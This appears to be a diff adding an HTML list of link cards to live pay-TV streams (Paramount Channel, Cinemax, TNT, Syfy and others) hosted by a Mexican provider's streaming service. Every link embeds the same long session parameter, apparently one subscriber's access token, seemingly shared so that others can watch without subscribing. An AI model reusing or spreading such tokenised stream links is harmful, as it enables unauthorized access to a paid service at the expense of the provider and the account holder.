+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=1726&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s106214_dark_360w_270h.png	"/> <h6>	PARAMOUNT CHANNEL	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=158&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s16794_dark_360w_270h.png	"/> <h6>	CINEMAX	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=149&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s105609_dark_360w_270h.png	"/> <h6>	CINECANAL	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=123&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s50709_dark_360w_270h.png	"/> <h6>	GOLDEN	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=122&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s68317_dark_360w_270h.png	"/> <h6>	GOLDEN +	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=124&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s16423_dark_360w_270h.png	"/> <h6>	GOLDEN EDGE	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=128&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s19246_dark_360w_270h.png	"/> <h6>	TCM	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=126&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s71727_dark_360w_270h.png	"/> <h6>	TNT	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=132&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s29017_dark_360w_270h.png	"/> <h6>	STUDIO UNIVERSAL	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=328&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s90653_dark_360w_270h.png	"/> <h6>	AMC	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=81&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s75073_dark_360w_270h.png	"/> <h6>	TBS	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=129&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s68021_dark_360w_270h.png	"/> <h6>	SPACE	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=137&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s87687_dark_360w_270h.png	"/> <h6>	FILMS & ARTS	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=136&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s16574_dark_360w_270h.png	"/> <h6>	EUROPA CHANNEL	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=135&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s16497_dark_360w_270h.png	"/> <h6>	I-SAT	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=140&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s107890_dark_360w_270h.png	"/> <h6>	MORBIDO TV	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=46&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s75423_dark_360w_270h.png	"/> <h6>	STAR CHANNEL	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=96&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s97571_dark_360w_270h.png	"/> <h6>	DISCOVERY H&H	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=48&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s19385_dark_360w_270h.png	"/> <h6>	SONY	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=205&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s16213_dark_360w_270h.png	"/> <h6>	WARNER	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=57&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s53218_dark_360w_270h.png	"/> <h6>	UNIVERSAL CHANNEL	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=71&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s91993_dark_360w_270h.png	"/> <h6>	TNT SERIES	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=85&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s102862_dark_360w_270h.png	"/> <h6>	TELEMUNDO INTERNACIONAL	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=1499&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s16521_dark_360w_270h.png	"/> <h6>	UNICABLE	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=78&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s55980_dark_360w_270h.png	"/> <h6>	DISTRITO COMEDIA	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=83&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s37232_dark_360w_270h.png	"/> <h6>	TL NOVELAS	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=62&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s10035_dark_360w_270h.png	"/> <h6>	A&E	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=340&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s76326_dark_360w_270h.png	"/> <h6>	COMEDY CENTRAL	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=55&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s30259_dark_360w_270h.png	"/> <h6>	E!	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=219&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s82970_dark_360w_270h.png	"/> <h6>	¡HOLA! TV	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=76&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s61514_dark_360w_270h.png	"/> <h6>	GLITZ	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=2145&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s91919_dark_360w_270h.png	"/> <h6>	FoodNetwork	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=94&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s89197_dark_360w_270h.png	"/> <h6>	LIFETIME	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=1842&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s17457_dark_360w_270h.png	"/> <h6>	MAS CHIC	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=215&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s16496_dark_360w_270h.png	"/> <h6>	TRUTV	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=59&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s56727_dark_360w_270h.png	"/> <h6>	SYFY	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=199&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s90309_dark_360w_270h.png	"/> <h6>	ANTENA 3	</h6></a></li>
